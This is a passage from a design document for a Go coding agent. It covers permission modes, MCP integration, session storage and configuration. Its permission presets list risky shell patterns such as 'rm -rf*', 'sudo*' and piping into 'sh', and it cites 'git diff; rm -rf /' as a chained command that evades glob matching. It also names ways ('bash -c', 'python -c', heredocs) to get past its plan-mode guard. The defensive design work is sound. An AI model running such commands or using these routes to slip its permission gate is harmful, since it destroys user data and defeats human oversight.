    dispatchConcurrent(ctx, group.calls, results)           // the code above
}
```

**6. Two invariants make parallelism safe.** Neither is optional.

*Per-file mutation mutex.* Parallel reads are safe; two writes to the same file are not. A
realpath-keyed mutex serializes same-file mutations while different files stay parallel —
pi's `file-mutation-queue`, about 30 lines. `EvalSymlinks` matters: `./a.go`, `a.go` and a
symlink pointing at it must all take the same lock, or the mutex silently does nothing.

```go
func (l *FileLocks) With(path string, fn func() error) error {
    real, err := filepath.EvalSymlinks(path)
    if err != nil { real = path } // non-existent file (a create) — lock the literal path
    mu, _ := l.m.LoadOrStore(real, &sync.Mutex{})
    m := mu.(*sync.Mutex)
    m.Lock()
    defer m.Unlock()
    return fn()
}
```

*Result ordering.* Tools finish whenever they finish, but `tool_result` blocks must be emitted
in the order the model requested them — every provider rejects a mismatch between the
`tool_use` sequence and the `tool_result` sequence. Writing by index into a pre-sized slice
(rule 4) gives this for free; the trap is any refactor that appends results as they arrive.

**7. Cancellation is one `context.CancelFunc` per turn**, stored on the TUI model. Esc is
two-stage — first press arms, second cancels (Crush's anti-fat-finger detail). The context
threads into the provider stream, every tool, the bash process group, the MCP call, and the
retry sleep, so an interrupt during a backoff sleep actually interrupts.

**8. Steering and follow-up are separate queues.** "Interrupt now" and "queue until done" are
different operations, and conflating them races the tool executor. Steering drains at step
boundaries; follow-ups only when the loop would otherwise stop.

**9. The tool registry is read via snapshot, written by the MCP manager.** The `[turn]`
goroutine never holds a lock on it — it took its snapshot at step 4 of §5 and reads a frozen
slice thereafter.

**10. Mode is read by the permission service, written by `Update`.** See §7.4.

### 6.1 Keeping the machine awake for the duration of a turn

A turn can run for minutes. If the machine idle-sleeps partway through, the turn dies. The
inhibitor is therefore scoped to exactly the `[turn]` goroutine's lifetime — acquired when a
turn starts, released in a `defer`.

```go
// internal/wakelock
type Lock interface{ Release() }

// Acquire returns a Lock that inhibits idle system sleep until released.
// It never returns an error: on any platform failure it returns a no-op Lock
// and logs at debug. A turn must never fail because the machine might sleep.
func Acquire(ctx context.Context, reason string) Lock
```

| Platform | Mechanism |
|---|---|
| macOS | `caffeinate -i -t 300` as a child process, re-armed while held |
| Linux | `systemd-inhibit --what=idle --who=rasp --why=… --mode=block`, via logind. Absent systemd → no-op |
| Windows | `SetThreadExecutionState(ES_CONTINUOUS \| ES_SYSTEM_REQUIRED)`; release with `ES_CONTINUOUS` alone |

Four properties, each of which is a bug if missed:

1. **Bounded and re-armed, never indefinite.** The macOS assertion is taken with `-t 300` and
   renewed on a ticker while the turn runs. A crash or `kill -9` then leaks at most five
   minutes instead of keeping the machine awake until the user notices a stray process. This is
   Claude Code's observed behaviour (`caffeinate -i -t 300`, confirmed via `pmset -g
   assertions`) and it's worth copying exactly.
2. **Idle *system* sleep only.** Not display sleep (`-d`), not sleep-on-battery (`-s`). The
   screen still dims and locks normally — inhibiting that would be user-hostile.
3. **Best-effort everywhere.** Missing binary, no systemd, unexpected syscall error: return the
   no-op lock. Headless Linux that never idle-sleeps needs nothing and should not warn.
4. **Windows needs `runtime.LockOSThread()`.** `SetThreadExecutionState` is *thread*-scoped, so
   without pinning, the Go scheduler can migrate the goroutine and the assertion silently
   evaporates. This is the single easiest way to ship a version that appears to work and
   doesn't.

Disableable via config (`"keep_awake": false`), default on.

---

## 7. Permissions and modes

Four modes ship in the MVP. The design constraint is the interesting part:

> **Modes are not a special case in the agent loop.** The loop does not know they exist.

They are permission presets. This is opencode's design, and it is the most elegant thing in
that report: their `plan` and `build` agents register identically and differ *only* in a
default permission map. "Modes" therefore cost zero branches in the loop, and custom
user-defined modes become nearly free later (§15).

| Mode | edit / write | bash | Gate |
|---|---|---|---|
| `plan` | deny | read-only patterns only | active |
| `manual` *(default)* | ask | ask | active |
| `auto` | allow | allow-listed, else ask | active |
| `yolo` | allow | allow | **short-circuited before every other check** |

`yolo` is not merely the most permissive preset — it is a different mechanism, and §7.7 shows
why that distinction matters.

### 7.1 Types

```go
package permission

type Mode string

const (
    ModePlan   Mode = "plan"
    ModeManual Mode = "manual" // default
    ModeAuto   Mode = "auto"
    ModeYolo   Mode = "yolo"   // NOT in the Shift+Tab cycle — see below
)

// cycleModes is the Shift+Tab rotation. ModeYolo is deliberately ABSENT from
// this array, which is what makes it structurally unreachable by cycling
// rather than merely discouraged. Reaching yolo requires --yolo or /yolo.
var cycleModes = [...]Mode{ModePlan, ModeManual, ModeAuto}

// Next advances the cycle. Cycling FROM yolo drops to manual — leaving yolo
// should always be easy, and landing somewhere safe is the right default.
func Next(m Mode) Mode {
    for i, c := range cycleModes {
        if c == m {
            return cycleModes[(i+1)%len(cycleModes)]
        }
    }
    return ModeManual
}

type Rule string

const (
    RuleAllow Rule = "allow"
    RuleAsk   Rule = "ask"
    RuleDeny  Rule = "deny"
)

// PatternRules maps a glob to a rule. Matched against a literal string —
// the whole bash command line, or "server__tool" for MCP.
type PatternRules map[string]Rule

type PermissionSet struct {
    Read  Rule // read, grep, find, ls
    Write Rule
    Edit  Rule
    Fetch Rule // reserved for phase-2 web tools
    Bash  PatternRules
    MCP   PatternRules
}
```

### 7.2 The presets, as data

```go
var Presets = map[Mode]PermissionSet{
    ModePlan: {
        Read: RuleAllow, Write: RuleDeny, Edit: RuleDeny, Fetch: RuleAsk,
        Bash: PatternRules{
            "*": RuleAsk, // unlisted commands ASK, they do not fail

            // search
            "rg*": RuleAllow, "grep*": RuleAllow, "ag*": RuleAllow,
            "fd*": RuleAllow, "find *": RuleAllow,

            // read-only version control
            "git status*": RuleAllow, "git diff*": RuleAllow,
            "git log*": RuleAllow, "git show*": RuleAllow,
            "git blame*": RuleAllow, "git branch": RuleAllow,
            "git remote -v": RuleAllow,

            // inspect
            "ls*": RuleAllow, "cat*": RuleAllow, "head*": RuleAllow,
            "tail*": RuleAllow, "wc*": RuleAllow, "file *": RuleAllow,
            "stat*": RuleAllow, "tree*": RuleAllow,

            // language tooling that only reads
            "go list*": RuleAllow, "go doc*": RuleAllow,
            "go env*": RuleAllow, "go vet*": RuleAllow,
            "npm ls*": RuleAllow, "cargo tree*": RuleAllow, "pip show*": RuleAllow,

            // environment
            "pwd": RuleAllow, "which*": RuleAllow, "echo*": RuleAllow,
            "env": RuleAllow, "date": RuleAllow,

            // carve-backs — more specific, so these win over the allows above
            "find * -delete*": RuleAsk, "find * -exec*": RuleAsk,
            "git checkout*": RuleAsk, "git reset*": RuleAsk,
            "git clean*": RuleAsk, "git push*": RuleAsk, "git stash*": RuleAsk,
            "go test*": RuleAsk,  // executes arbitrary code from _test.go files
            "go build*": RuleAsk, // writes build artifacts
            "sed -i*": RuleAsk, "perl -i*": RuleAsk,
        },
        MCP: PatternRules{"*": RuleAsk},
    },

    ModeManual: {
        Read: RuleAllow, Write: RuleAsk, Edit: RuleAsk, Fetch: RuleAsk,
        Bash: PatternRules{
            "*":           RuleAsk,
            "git status*": RuleAllow,
            "git diff*":   RuleAllow,
            "git log*":    RuleAllow,
            "ls*":         RuleAllow,
            "rg*":         RuleAllow,
        },
        MCP: PatternRules{"*": RuleAsk},
    },

    ModeAuto: {
        Read: RuleAllow, Write: RuleAllow, Edit: RuleAllow, Fetch: RuleAllow,
        Bash: PatternRules{
            "*":         RuleAllow,
            "rm -rf*":   RuleAsk, // auto is not reckless
            "sudo*":     RuleAsk,
            "git push*": RuleAsk,
            "* | sh*":   RuleAsk,
        },
        MCP: PatternRules{"*": RuleAllow},
    },

    // ModeYolo is listed for completeness and for `rasp config check` output.
    // It is never consulted at runtime — the short-circuit in §7.7 answers
    // first, so no pattern in this set is ever evaluated.
    ModeYolo: allowEverything(),
}
```

Auto still asks for a handful of genuinely destructive patterns. That is deliberate and worth
keeping honest — "auto" means "don't interrupt me for ordinary work," not "never stop." That
distinction is precisely what `yolo` gives up, and why it is a separate mode rather than a
looser `auto`.

### 7.3 Glob resolution — specificity, not map order

Several patterns will match one command. Go map iteration order is randomized, so leaving this
to chance would make permission decisions nondeterministic. The rule is explicit:

> **Most specific wins.** Specificity = the count of non-wildcard characters in the pattern.
> Ties break lexicographically, so the result is fully deterministic.

```go
// resolveBash picks the rule for a literal command string.
//
//   "find *"          → 5 literal chars
//   "find * -delete*" → 13 literal chars   ← wins for `find . -delete`
//
// Patterns are compiled and sorted once per PermissionSet, not per call.
func (p *compiledSet) resolveBash(cmd string) Rule {
    for _, pat := range p.bashSorted { // pre-sorted, descending specificity
        if pat.match(cmd) {
            return pat.rule
        }
    }
    return RuleAsk // fail-closed when nothing matches
}
```

Matching is `filepath.Match`-style over the whole command string. This is a **usability
feature, not a security boundary** — `git diff; rm -rf /` matches `git diff*` and would be
allowed. That limitation is documented in the user-facing docs rather than papered over. The
real protections are `os.Root` confinement and the fact that a human is watching.

### 7.3a The redirection guard

Glob-matching a command string has a specific hole that matters most in plan mode: **the shell
writes files without any write-looking command being involved.**

```bash
echo "package main" > auth.go      # matches echo*  → would be allowed
cat template.go > handler.go       # matches cat*   → would be allowed
go vet ./... | tee report.txt      # matches go vet* → would be allowed
```

So plan mode applies one hard check *before* glob resolution, and it is a deny rather than an
ask because there is no legitimate read-only use of output redirection:

```go
var redirectPattern = regexp.MustCompile(`(^|[^0-9<>])>>?[^>]|\|\s*tee\b`)

// planPreflight runs before resolveBash. Plan mode only.
func planPreflight(cmd string) (Rule, bool) {
    if redirectPattern.MatchString(cmd) {
        return RuleDeny, true
    }
    return 0, false
}
```

**Say plainly what this is worth.** It closes the accidents — a model reaching for `>` because
that's the shortest way to write a file. It does not close the hole: `bash -c "..."`,
`python -c`, `xargs`, or a heredoc all defeat it, and enumerating them is a losing game.

> **Plan mode is a strong speed bump, not a proof.** It reliably stops a model from modifying
> your tree by accident, which is what it is for. It does not constrain a model actively trying
> to escape it. The docs must say this rather than implying a guarantee — an overstated
> guarantee is worse than the gap, because it changes what the user does with it.

pi is not a reference here. It ships no plan mode and no permission gating at all — *"No plan
mode. Write plans to files, or build it with extensions"* (their README). The references are
opencode and Claude Code.

### 7.4 Where mode lives, and who mutates it

Mode is **session state**, not config and not loop state.

- **Persisted** as `EntryModeChange`, a first-class session entry alongside model changes — so
  replaying a session reproduces which mode produced which turn.
- **Read** by the permission service at `Ask` time. Never read by `agent`.
- **Written** by the `[bubbletea]` `Update` goroutine (Shift+Tab) or by a slash command.

Synchronization against an in-flight turn is one `atomic.Pointer`:

```go
type Service struct {
    yolo    atomic.Bool                 // the short-circuit; see §7.7
    mode    atomic.Pointer[compiledSet] // written by Update, read by Ask
    grants  sync.Map                    // (tool, action, path) → granted
    pending sync.Map                    // callID → chan Decision
}

func (s *Service) SetMode(m Mode) {
    s.yolo.Store(m == ModeYolo)
    s.mode.Store(compile(m, s.overrides))
}
```

Because `Ask` loads the pointer at the moment of the check, a mid-turn switch **takes
effect at the next permission check and is never retroactive**. A tool already running to
completion under the old mode finishes; the next one is evaluated under the new one. That is
the only sane semantics, and it falls out of the design rather than needing a special case.

### 7.5 Mode switching tells the model

A silent constraint change produces a confused model that keeps proposing edits it cannot
make. So a switch injects a synthetic user-role reminder into the transcript, exactly as
opencode does:

```
[Mode changed to plan. You can no longer edit or write files. Investigate and
propose a plan; the user will switch you to manual or auto to carry it out.]
```

It is a normal transcript message — persisted, replayed, and visible in the UI as a system
notice rather than a user bubble.

### 7.6 Prompt-caching interaction — mode text goes in the uncached tail

If mode instructions live in the system prompt, switching mode changes the prompt. Whether
that costs anything depends entirely on **which block** it lands in, because the Anthropic
cache is a prefix match (§11).

**Decision: mode text goes in the dynamic, uncached tail — never in a cached block.**

Reasoning: Shift+Tab is a frequent, casual action. If mode text sat in an early block, every
toggle would invalidate the cached prefix containing tool descriptions and the entire
`AGENTS.md` composition — thousands of tokens re-billed for a ~60-token change. Putting it
last costs those ~60 tokens on every request and invalidates nothing. That trade is not close.

### 7.7 The approval ladder

`Ask` consults, in order, short-circuiting on the first answer:

```
0. yolo active?                                      → allow   ← atomic.Bool, before everything
1. mode preset resolves to allow?                    → allow
2. mode preset resolves to deny?                     → deny (no prompt)
3. config allow-list matches?                        → allow
4. session grant for (tool, action, path) exists?    → allow
5. otherwise → publish EventPermission, block on a channel, ask the user
```

```go
func (s *Service) Ask(ctx context.Context, req Request) error {
    if s.yolo.Load() {
        return nil // rung 0: one atomic load, ahead of every map lookup
    }
    ...
}
```

**Why yolo is rung 0 rather than a permissive preset.** Crush uses an `atomic.Bool` checked
first for exactly this, and the reasoning holds up three ways. It is unambiguous — no pattern
can accidentally deny under yolo, because no pattern is consulted. It is cheap — one atomic
load instead of a compiled glob walk on every tool call. And it is honest — "yolo" is a
different *kind* of statement from "auto," and collapsing it into the same mechanism invites
exactly the bug where a stray config override makes yolo unexpectedly prompt.

Crush's ladder otherwise, plus modes at rungs 1–2 ([findings.md](findings.md)).
Grants are keyed by path, so "always allow writes in `internal/`" does not silently cover
`~/.ssh`, and they are session-scoped and in-memory — they do not persist across restarts.

### 7.8 TUI

- **Shift+Tab cycles** plan → manual → auto → plan. **Yolo is not in the cycle** (§7.1) — it
  requires `--yolo` at launch or `/yolo` explicitly. You cannot reach it by leaning on a key.
- The current mode renders in the **status line**, colour-coded (plan blue, manual default,
  auto amber) — a persistent reminder, since "which mode am I in" is the question the
  permissive modes make expensive to get wrong.
- **Yolo renders a loud, persistent indicator** while active: an inverse-video `⚡ YOLO` badge
  in the status line, and a coloured border on the input area. It never fades and is never
  collapsed into a subtle glyph. If every guardrail is off, the interface should say so
  continuously — not once at startup, when the user has already stopped reading.
- In **auto**, the permission overlay never appears for allow-listed actions; the tool card
  renders with a small "auto-approved" marker so the action stays visible.
- In **plan**, a denied action renders inline as a dimmed tool card with the reason, so the
  user can see what the model wanted to do.

---

## 8. MCP integration

**In the MVP, tightly scoped**, and sequenced as the **last MVP milestone** — after the core
loop, the eight tools and streaming are solid. It is the one place where third-party code runs
inside our process boundary, and it deserves a stable foundation underneath it.

| In v1 | Out of v1 |
|---|---|
| **stdio transport only** — spawn a subprocess, JSON-RPC over stdin/stdout | HTTP and Streamable HTTP transports |
| Official `github.com/modelcontextprotocol/go-sdk`, version-pinned | OAuth-authenticated servers |
| Tool discovery and tool calls | MCP resources and prompts |
| Servers from `.mcp.json`, rasp config, optionally Claude Desktop's config | Server-initiated sampling |

### 8.0 The containment rule

> **No MCP type, error code, method name or protocol concept may leave `internal/mcp`.**
> The package exposes exactly two things: `tool.Tool` values, and a small lifecycle API
> (`Start`, `Shutdown`, `Status`). Nothing else crosses the boundary.

This is the single most important MCP decision in the design, and it is driven by evidence
rather than taste: **MCP has shipped two breaking revisions in eight months.** Revision
2026-07-28 alone removed the `initialize` / `notifications/initialized` handshake outright,
made the protocol stateless with version and capability data riding in `_meta` on every
request, added a required `resultType` field to all results, added a new `server/discover`
RPC, deprecated Roots, Sampling and Logging, removed `ping` and `logging/setLevel`, formally
deprecated HTTP+SSE, loosened schema validation to full JSON Schema 2020-12, and deprecated
OAuth Dynamic Client Registration.

Any one of those would be an afternoon inside a sealed package. Any one of them would be a
week if MCP concepts had leaked into the registry, the loop, or the TUI.

**The test, stated as an invariant:** a new MCP spec revision must be a dependency bump plus
changes confined to `internal/mcp/`. If a revision ever forces an edit to `internal/agent`,
`internal/tool` or `internal/tui`, the boundary was drawn wrong and fixing it takes priority
over shipping the revision.

Concretely, this means:

- `mcp.Tool` implements `tool.Tool` and exposes nothing else. Callers see a `tool.Tool`.
- A server error becomes a `tool.Result{IsError: true}` with a human-readable string. No MCP
  error code, no `jsonrpc.Error`, ever reaches `agent`.
- Schemas are `map[string]any`, opaque, passed through (§3.2).
- Protocol handshake details — `initialize` in the old spec, `server/discover` and `_meta` in
  the new one — are entirely internal to `connectStdio`.
- `resultType` is handled at the boundary: absent means `"complete"` (the spec's required
  treatment of older servers), and `"input_required"` maps to a `tool.Result` explaining that
  interactive MCP flows are unsupported in v1 — not a new concept in our type system.

### 8.1 Discovery

Two sources at runtime, merged, later wins:

| Source | Path |
|---|---|
| Project | `./.mcp.json` |
| rasp config | `mcp.servers` in global or project config |

Other products' config files are **not** in that list. They are read exactly once, by the
first-run import in §10.1, and copied into rasp's own config. After that they are never
consulted again.

That's a deliberate reversal of the earlier design, and the reason is the same one driving
§8.0's containment rule: reading another product's file on every startup makes their schema
part of our runtime contract. Anthropic can restructure `claude_desktop_config.json` whenever
they like, and under a read-every-startup design that becomes our bug, appearing at launch, in
a code path the user cannot inspect. Importing once converts a permanent coupling into a
one-time translation.

`.mcp.json` uses the same shape everyone else does, so an existing file works unmodified:

```json
{
  "mcpServers": {
    "github": {
      "command": "npx",
      "args": ["-y", "@modelcontextprotocol/server-github"],
      "env": { "GITHUB_TOKEN": "$(gh auth token)" }
    }
  }
}
```

Servers that arrive via the first-run import are written into rasp's config in this same shape,
so there is one representation regardless of where a server originally came from.

### 8.2 The MCP tool — schema pass-through

```go
package mcp

// Tool adapts one server-advertised tool to tool.Tool. The schema is whatever
// the server sent, used VERBATIM: we neither validate nor re-derive it. If a
// server sends a schema its own handler rejects, that is a server bug and it
// surfaces as an ordinary tool error.
type Tool struct {
    server string
    raw    string         // the server's own tool name
    desc   string
    schema map[string]any // straight from tools/list
    client *Client
}

func (t *Tool) Name() string           { return "mcp__" + t.server + "__" + t.raw }
func (t *Tool) Description() string    { return t.desc }
func (t *Tool) Schema() map[string]any { return t.schema }

func (t *Tool) Run(ctx context.Context, raw json.RawMessage) (tool.Result, error) {
    ctx, cancel := context.WithTimeout(ctx, t.client.callTimeout)
    defer cancel()

    out, err := t.client.CallTool(ctx, t.raw, raw)
    if err != nil {
        // A dead server is a tool error, not a turn error. The model sees
        // it, can adapt, and the turn continues.
        return tool.Result{
            Content: fmt.Sprintf("MCP server %q failed: %v", t.server, err),
            IsError: true,
        }, nil
    }
    return tool.Result{Content: out.Text, Title: t.raw, Details: out.Structured}, nil
}
```

`mcp__<server>__<tool>` is Claude Code's convention. Using it means a server's documentation
and a user's muscle memory both transfer.

MCP tools **do** implement `Sequential`, returning true — inverting the parallel-by-default
rule for third-party code specifically (§6 rule 4). We audited our own tools for reentrancy;
we cannot audit someone else's server.

### 8.3 Lifecycle and failure isolation

The requirement is blunt: **a dead or slow server must never block startup or hang an
turn.** Three mechanisms.

**Connect in the background, at startup.** Not lazily on first use — we need the tool list
before we can build the prompt. One goroutine per server, spawned immediately, none blocking:

```go
func (m *Manager) Start(ctx context.Context) {
    for name, cfg := range m.servers {
        go m.run(ctx, name, cfg) // owns this server's subprocess for its lifetime
    }
}

func (m *Manager) run(ctx context.Context, name string, cfg ServerConfig) {
    dial, cancel := context.WithTimeout(ctx, cfg.Timeout) // default 10s
    defer cancel()

    // connectStdio spawns the subprocess and performs whatever discovery the
    // pinned spec revision requires. Which RPCs that involves is an
    // implementation detail of THIS package and nothing above it (§8.0).
    c, err := connectStdio(dial, cfg)
    if err != nil {
        m.markFailed(name, err) // logged; shown in `rasp mcp list` and the TUI
        return                  // no auto-retry in v1
    }

    m.registry.Replace("mcp:"+name, c.Tools()) // ← visible at the NEXT snapshot

    // Refresh when the server's advertised TTL expires. `CacheableResult`
    // (ttlMs, cacheScope) became required on tool listings in revision
    // 2026-07-28; absent or zero means "cache until the process exits".
    for {
        select {
        case <-c.ToolsExpired():
            if tools, err := c.RefreshTools(ctx); err == nil {
                m.registry.Replace("mcp:"+name, tools)
            }
        case <-ctx.Done():
            c.Shutdown() // close stdin, wait, then kill the process group
            return
        }
    }
}
```

A refresh lands in the registry, not in any in-flight turn — the snapshot taken at the
start of a turn is immutable for its duration (§3.3), so a mid-turn refresh can never
change the tool list underneath a running loop.

**The first turn waits, briefly and boundedly.** `Send` waits up to `settleTimeout`
(2s) for the initial connection round, then proceeds with whatever is ready. A server that
finishes connecting at t=8s simply appears in the next turn's snapshot. Startup is never
blocked; the first turn is delayed by at most two seconds.

**A crash mid-turn is an ordinary tool error.** The snapshot still holds that server's
tools, so a call still routes there, `CallTool` fails, and the model gets an error result it
can work around. No panic, no aborted turn. The server disappears from the *next*
snapshot.

**Reaping.** Each server goroutine owns its subprocess. On shutdown the manager context is
cancelled; each goroutine closes stdin, waits briefly, then kills the process group — the same
`Setpgid` + negative-PID technique the bash tool uses (§12), because an MCP server spawned via
`npx` is itself a parent of other processes.

### 8.4 Tool-count budget and per-server allow-lists

Some servers expose 40+ tools. Every tool's name, description and schema is sent **on every
request** and sits in the cached prefix. Three servers of that size can cost more context than
the conversation.

```json
"mcp": {
  "max_total_tools": 60,
  "servers": {
    "github": {
      "command": "npx",
      "args": ["-y", "@modelcontextprotocol/server-github"],
      "tools": ["search_repositories", "get_file_contents", "create_issue"],
      "timeout": "10s"
    }
  }
}
```

- **`tools`** — a per-server allow-list. Absent means all of them.
- **`max_total_tools`** — a global ceiling (default 60, including the eight built-ins). On
  exceeding it, rasp keeps built-ins plus servers in config order, drops the rest, and warns
  loudly with the exact count. Silently truncating a tool list would produce baffling "the
  model won't use my tool" reports.

**The caching interaction, stated plainly.** The tool list is part of the cached prompt prefix,
and two things can silently destroy it:

1. **A server connecting or refreshing mid-session** changes the list. Unavoidable, but bounded:
   the snapshot is taken **once per turn** (§3.3), so within a turn the list is
   byte-identical and multi-step turns — the common case — keep their cache. A newly
   connected server costs exactly one cache miss, once.
2. **Unstable ordering.** If a server returns its tools in a different order on each listing,
   the serialized prefix differs every request and the cache hit rate is *zero* — with no error
   and no obvious symptom, just a quietly larger bill. Revision 2026-07-28 now recommends
   servers return listings deterministically for precisely this reason, but we sort by name in
   `Set` regardless rather than trusting compliance (§3.3).

Worth watching `cache_read_input_tokens` in the status line during development for exactly
this: a cache-hit rate that drops to zero after adding an MCP server is the signature.

### 8.5 What `internal/mcp` does **not** contain

- **No permission logic.** MCP tools flow through the same `permission.Service` and the same
  mode presets as built-ins. `PermissionSet.MCP` patterns match `server__tool`.
- **No schema interpretation.** The server's JSON Schema is passed through untouched (§3.2).
- **No transport but stdio.** Streamable HTTP would live in a sibling implementation of the
  same `Client` interface when it arrives. HTTP+SSE specifically is now formally deprecated
  upstream, so it will never be built.
- **No resources, prompts, roots, sampling or logging.** Tools only. The last three are
  deprecated upstream anyway (§15).
- **No auto-retry or reconnect.** A failed server stays failed until `rasp mcp reconnect` or a
  restart. Reconnect storms against a broken config are worse than an honest error.
- **And, per §8.0: no MCP type escapes the package.** This is the rule that makes the next
  breaking revision a contained change.

---

## 9. Storage

### Format: append-only JSONL

One file per session, one JSON object per line. What Claude Code, pi and opencode all do.

- Appending never rewrites the file — no O(n) write per turn.
- A crash leaves a valid file up to the last complete line; a torn final line is skipped.
- `tail -f` and `jq` work on it. That matters more than it sounds while debugging a loop.
- Resume is "read the file, replay it."

### Layout

```
~/.local/share/rasp/                     # $XDG_DATA_HOME
  sessions/
    <project-key>/
      20260808T024153_01J8XZ4Q7K.jsonl
  logs/
    rasp.log
```

`<project-key>` is the repo's **first commit hash** (`git rev-list --max-parents=0 --all`),
falling back to a hash of the absolute path outside a repo. opencode's trick: the same repo
maps to the same bucket regardless of where it is checked out, so sessions follow the project
rather than the directory.

### On-disk example

```jsonl
{"id":"01J8XZ4Q7K","parent_id":"","kind":"meta","time":"2026-08-08T02:41:53Z","cwd":"/Users/theo/Projects/rasp","model":"claude-opus-5","provider":"anthropic","mode":"manual"}
{"id":"01J8XZ4R2A","parent_id":"01J8XZ4Q7K","kind":"message","time":"2026-08-08T02:41:53Z","message":{"role":"user","content":[{"type":"text","text":"fix the failing auth test"}]}}
{"id":"01J8XZ4X9C","parent_id":"01J8XZ4R2A","kind":"message","time":"2026-08-08T02:42:01Z","message":{"role":"assistant","content":[{"type":"text","text":"Let me look at the test."},{"type":"tool_use","id":"toolu_01A9","name":"read","input":{"path":"internal/auth/check_test.go"}}],"stop_reason":"tool_use","usage":{"input":4210,"output":88,"cache_read":3900}}}
{"id":"01J8XZ4X9D","parent_id":"01J8XZ4X9C","kind":"message","time":"2026-08-08T02:42:01Z","message":{"role":"user","content":[{"type":"tool_result","tool_use_id":"toolu_01A9","content":"package auth\n\nfunc TestCheck(t *testing.T) {\n...","is_error":false}]}}
{"id":"01J8XZ51A0","parent_id":"01J8XZ4X9D","kind":"mode_change","time":"2026-08-08T02:43:02Z","mode":"auto"}
{"id":"01J8XZ52B1","parent_id":"01J8XZ51A0","kind":"model_change","time":"2026-08-08T02:44:10Z","model":"claude-sonnet-5","provider":"anthropic"}
{"id":"01J8Y0F3K9","parent_id":"01J8XZ52B1","kind":"compaction","time":"2026-08-08T03:02:44Z","summary":"Goal: fix the failing auth test...","replaced":22}
```

Note the assistant message and its `tool_result` are **adjacent** — written in one `Append`,
per invariant 1. Mode and model changes are **first-class entries**, so replay reproduces
which mode and which model produced which turn. Compaction is an entry too, so reopening a
session reconstructs context deterministically without re-running the LLM.

### Atomic writes

Appends use `O_APPEND` on a single open handle — atomic below `PIPE_BUF`, tolerable above it
since a torn final line is skipped on read. The **meta** file (index, title, token totals) is
rewritten wholesale, so it uses temp-file + `rename`, atomic on POSIX. pi does exactly this.

### Session titles

The picker lists sessions by title, so something has to produce one. It is a single call on
`small_model` (falling back to `model`) over the first user message, asking for a few words with
no trailing punctuation — naming a conversation is not work that needs the model that reasons
about code, which is the same argument compaction makes in §11.

Three rules, and the first is the only one that is hard:

1. **It never touches the critical path.** The call is dispatched in the background *after* the
   first turn is already streaming. A title is worth nothing until the picker is opened, possibly
   days later, so paying even 300ms of it before the first token would trade the one latency
   number prd §8 will not trade. Verify this the way it can fail — with the title call
   blackholed, not by observing that it happened to be fast.
2. **Failure is ordinary, not exceptional.** No retry loop, no error surfaced to the user, no
   effect on the session. An untitled session displays its first user message, truncated. That
   fallback is good enough often enough — *"fix the auth bug"* reads fine — that the model call
   exists only for the cases it isn't: a pasted stack trace, or three paragraphs of context.
3. **The title is a session entry as well as a meta field.** The meta file is what the picker
   reads, but the entry is what makes replay agree with it without re-running the call.

A session that never got a title can be given one later, so a spell of failing calls doesn't
leave a permanently unreadable list.

### Why there is no session index — and why that isn't a deferral

The obvious objection to JSONL is listing: a session picker has to open every file to read its
title. That objection assumes a global list. **Sharding by `<project-key>` removes it.** The
picker shows sessions for *this repo* — tens, not thousands — and rasp exposes no view that
enumerates every session ever. The cost is bounded by sessions-per-project, which is bounded by
how much work you've done in one repo.

So this is not "defer the index until later." It's "the data layout means there is nothing to
index."

Both alternatives have documented costs, and they're worth stating because they're the reason
this is a decision rather than laziness:

- **A sidecar index file** — what neo does with `index.json` — needs coordination the
  append-only files don't. neo's own source comments admit *"concurrent neo processes can lose
  index updates."* Two rasp windows in the same repo is an ordinary situation, not an exotic one.
- **SQLite from the start** — what Crush does via `modernc.org/sqlite` — brings migrations
  (`goose`), query codegen (`sqlc`), and a footgun their source documents: they force
  `SetMaxOpenConns(1)` because concurrent sub-agent sessions caused WAL desync
  (`SQLITE_NOTADB`).

JSONL stays the **sole source of truth**. If the picker ever exceeds ~50ms, an index becomes
purely additive — one row per session, transcript untouched — and nothing above the storage
layer has to change to accommodate it.

---

## 10. Configuration

Two files, both **JSONC** — JSON with `//` and `/* */` comments stripped before parsing —
deep-merged. Crush and opencode both use JSONC, and the reason is mundane: a config you
hand-edit needs to explain itself, and plain JSON offers nowhere to write *why* a setting is
what it is. The cost is one small dependency and the fact that a strict JSON parser elsewhere
will choke on the file, which is why the extension stays `.json` rather than `.jsonc` — every
editor already applies JSONC tolerance to files by that name in this ecosystem.

The [teaching doc](internals.md) covers authoring them; this is the mechanism.

### Precedence

```
1. Command-line flags              --model, --mode
2. Environment                     RASP_MODEL, ANTHROPIC_API_KEY, ...
3. Project config                  ./.rasp/config.json   (+ ./.mcp.json)
4. Global config                   ~/.config/rasp/config.json
5. Built-in defaults
```

Later entries lose. Merge is per-key deep merge, not whole-object replacement, so a project
config can override one model without restating providers.

**There is no `--provider`.** A model id carries its provider — `anthropic/claude-opus-5`,
`openrouter/auto` — so a separate flag would be a second way to say the same thing and the
first way to contradict it. Whichever won, the other would be a setting that reads as applied
and is not.

> **`--yolo` is deliberately absent from that list.** It is not a config value that happens to
> sit at the top of a precedence chain — it is a flag that arms the rung-0 bypass in §7.7,
> which answers before any `PermissionSet` is consulted. Putting it in the precedence stack
> would imply a lower layer could set it, and §10's "yolo may not be set by project config"
> rule exists precisely to prevent that. The two mechanisms are different by design:
> `--mode plan` selects a preset; `--yolo` disables the mechanism that reads presets.

### Schema

```jsonc
{
  "$schema": "https://rasp.dev/schema.json",
  "model": "anthropic/claude-opus-5",
  "small_model": "anthropic/claude-haiku-4-5",   // compaction and session titles; see §11
  "mode": "manual",

  "providers": {
    "anthropic": { "api_key": "$(op read op://vault/anthropic/key)" },
    "openrouter": {
      "base_url": "https://openrouter.ai/api/v1",
      "api_key": "${OPENROUTER_API_KEY}",
      "models": ["moonshotai/kimi-k2", "deepseek/deepseek-v3"]
    },
    "ollama": {
      "base_url": "http://localhost:11434/v1",
      "api_key": "unused",
      "models": ["qwen3-coder:30b"]
    }
  },

  "modes": {
    "manual": {
      "bash": { "go build*": "allow", "go test*": "allow" }
    }
  },

  "mcp": {
    "max_total_tools": 60,
    "servers": {
      "github": {
        "command": "npx",
        "args": ["-y", "@modelcontextprotocol/server-github"],
        "env": { "GITHUB_TOKEN": "$(gh auth token)" },
        "tools": ["search_repositories", "get_file_contents"],
        "timeout": "10s"
      }
    }
  },

  "context": {
    "files": ["AGENTS.md", "CLAUDE.md"],
    "reserve_tokens": 16384
  },

  "ui": { "theme": "auto", "diff": "unified" }
}
```

`modes.<name>` deep-merges onto the built-in preset, so a user adds `"go test*": "allow"` to
manual mode without restating the whole map.

**Two constraints on `mode`, both about the same hazard.** A project config is a file in a
repository — it arrives from `git clone`, and nobody reads it.

1. **`"mode": "yolo"` is rejected in a *project* config.** It is accepted only in the global
